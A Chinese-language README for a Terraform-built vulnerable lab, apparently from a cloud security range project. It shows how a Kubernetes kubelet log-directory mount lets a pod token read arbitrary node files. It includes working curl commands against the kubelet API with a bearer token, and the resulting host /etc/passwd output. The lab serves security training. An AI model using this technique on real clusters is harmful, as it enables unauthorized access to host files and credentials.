# kubernetes log目录挂载漏洞环境

[English](./README.md) | 中文

## 描述信息

这是一个用于构建kubernetes log目录挂载漏洞环境的靶场。

使用 terraform 构建环境后，用户可以通过 kubelet组件 读取kubelet节点上的任意文件内容。

## 环境搭建

在容器中执行以下命令

```shell
cd /TerraformGoat/kubernetes/kubelet/log-mount
```

配置阿里云访问凭证

```shell
export ALICLOUD_ACCESS_KEY="LTAI5tFkmNGXXXXXXXXX"
export ALICLOUD_SECRET_KEY="ORBs2lulAHDXXXXXXXXX"
export ALICLOUD_REGION="cn-hongkong"
```

> 在阿里云控制台的 [AccessKey 页面](https://ram.console.aliyun.com/manage/ak) 可以创建和查看您的 AccessKey

部署靶场

```shell
terraform init
terraform apply
```

> 在终端提示 `Enter a value:` 时，输入 `yes` 即可

![img](../../../images/20220622-174141.jpg)

环境搭建完后，在 Outputs 处可以看到kubelet api的访问地址。

## 漏洞利用

首先，我们需要读取挂载在pod的token值。它一般会挂载到容器的`/var/run/secrets/kubernetes.io/serviceaccount/token`，你也可以在terraform最后的输出中找到，如下

```shell
alicloud_instance.instance (remote-exec): *** you can run below command to read '/etc/passwd' via kubelet api ***

alicloud_instance.instance (remote-exec): curl https://:10250/logs/pods/default_busybox_558731dd-284e-4dc7-be8f-529ead48db07/busybox/0.log -H "Authorization:Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IkVEcXNHMEUtRGl0eGJhXzNHd3ZGSXBHblRUTUFRZURmclFXdjZERjYyZ28ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjg3ODQ5MjI0LCJpYXQiOjE2NTYzMTMyMjQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJidXN5Ym94IiwidWlkIjoiNTU4NzMxZGQtMjg0ZS00ZGM3LWJlOGYtNTI5ZWFkNDhkYjA3In0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJkZWZhdWx0IiwidWlkIjoiMjVjMzZlMjAtYTRiNC00ZWY3LWI5OGQtN2I3MjhlMmJiMDA3In0sIndhcm5hZnRlciI6MTY1NjMxNjgzMX0sIm5iZiI6MTY1NjMxMzIyNCwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6ZGVmYXVsdCJ9.gSjGOnzlPE5ML-VpPN_RYdI83I1xne1m5MHxGY0x1u7RUW2-gSnCfq43f2tnFB11x3ZCGF8H91nNnA49rM9QKCQ63l5VlUUnpESMrn9oNTIH4g1jVy8--9Vr-hHwom9cVxNpdNY5kuK60pq-ahNVhyKCSD39NkHYocaOlgXRIMjpG7yBNoPWqPLvzdftYnhfpQ4oZdf59fSVzfO0z28J-7LKL2pfDt61UE5qJfGqc5CzO7CQfSZTTrrKGZ1EVpkA3u4CBUG_fsynUFx5-yu9VvQhqFwgw2jUGP_0C4OJ8Gx6Ib4l_bd9TrIah8neIddCyFT_DVhFsGr2ZVY0Qazmcw" -k
```

然后，我们需要知道kubelet节点的外网ip地址。你也可以从terraform输出中看到，如下

```shell
Outputs:

kubelet_log-mount_lab_address_link = "https://8.218.13.212:10250"
```

现在，我们就可以访问kubelet 日志api，可以读取任意pod日志

```shell
➜  log-mount git:(main) ✗ curl https://8.218.13.212:10250/logs/ -H "Authorization:Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IkVEcXNHMEUtRGl0eGJhXzNHd3ZGSXBHblRUTUFRZURmclFXdjZERjYyZ28ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjg3ODQ5MjI0LCJpYXQiOjE2NTYzMTMyMjQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJidXN5Ym94IiwidWlkIjoiNTU4NzMxZGQtMjg0ZS00ZGM3LWJlOGYtNTI5ZWFkNDhkYjA3In0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJkZWZhdWx0IiwidWlkIjoiMjVjMzZlMjAtYTRiNC00ZWY3LWI5OGQtN2I3MjhlMmJiMDA3In0sIndhcm5hZnRlciI6MTY1NjMxNjgzMX0sIm5iZiI6MTY1NjMxMzIyNCwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6ZGVmYXVsdCJ9.gSjGOnzlPE5ML-VpPN_RYdI83I1xne1m5MHxGY0x1u7RUW2-gSnCfq43f2tnFB11x3ZCGF8H91nNnA49rM9QKCQ63l5VlUUnpESMrn9oNTIH4g1jVy8--9Vr-hHwom9cVxNpdNY5kuK60pq-ahNVhyKCSD39NkHYocaOlgXRIMjpG7yBNoPWqPLvzdftYnhfpQ4oZdf59fSVzfO0z28J-7LKL2pfDt61UE5qJfGqc5CzO7CQfSZTTrrKGZ1EVpkA3u4CBUG_fsynUFx5-yu9VvQhqFwgw2jUGP_0C4OJ8Gx6Ib4l_bd9TrIah8neIddCyFT_DVhFsGr2ZVY0Qazmcw" -k
<pre>
<a href="apt/">apt/</a>
<a href="auth.log">auth.log</a>
<a href="btmp">btmp</a>
<a href="chrony/">chrony/</a>
<a href="cloud-init.log">cloud-init.log</a>
```

并且通过kubelet 日志api读取恶意pod日志时，我们可以获取"宿主机/etc/passwd"文件内容

```shell
➜  log-mount git:(main) ✗ curl https://8.218.13.212:10250/logs/pods/default_busybox_558731dd-284e-4dc7-be8f-529ead48db07/busybox/0.log -H "Authorization:Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IkVEcXNHMEUtRGl0eGJhXzNHd3ZGSXBHblRUTUFRZURmclFXdjZERjYyZ28ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjg3ODQ5MjI0LCJpYXQiOjE2NTYzMTMyMjQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJidXN5Ym94IiwidWlkIjoiNTU4NzMxZGQtMjg0ZS00ZGM3LWJlOGYtNTI5ZWFkNDhkYjA3In0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJkZWZhdWx0IiwidWlkIjoiMjVjMzZlMjAtYTRiNC00ZWY3LWI5OGQtN2I3MjhlMmJiMDA3In0sIndhcm5hZnRlciI6MTY1NjMxNjgzMX0sIm5iZiI6MTY1NjMxMzIyNCwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6ZGVmYXVsdCJ9.gSjGOnzlPE5ML-VpPN_RYdI83I1xne1m5MHxGY0x1u7RUW2-gSnCfq43f2tnFB11x3ZCGF8H91nNnA49rM9QKCQ63l5VlUUnpESMrn9oNTIH4g1jVy8--9Vr-hHwom9cVxNpdNY5kuK60pq-ahNVhyKCSD39NkHYocaOlgXRIMjpG7yBNoPWqPLvzdftYnhfpQ4oZdf59fSVzfO0z28J-7LKL2pfDt61UE5qJfGqc5CzO7CQfSZTTrrKGZ1EVpkA3u4CBUG_fsynUFx5-yu9VvQhqFwgw2jUGP_0C4OJ8Gx6Ib4l_bd9TrIah8neIddCyFT_DVhFsGr2ZVY0Qazmcw" -k
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
```

## 销毁环境

```shell
terraform destroy
```
